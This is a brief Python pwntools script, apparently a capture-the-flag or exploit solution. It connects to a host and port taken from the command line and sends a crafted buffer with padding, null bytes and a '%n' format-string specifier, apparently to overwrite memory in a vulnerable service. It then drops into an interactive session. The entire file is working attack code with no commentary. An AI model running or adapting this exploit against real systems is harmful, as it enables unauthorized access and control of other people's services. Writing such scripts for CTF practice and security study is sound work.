from pwn import *
from sys import argv

con = remote(argv[1], int(argv[2],10))
con.send("B" * 21 + "\x00\x00\x00\x05.%n\n")
con.send("B\x00\n")
con.interactive()
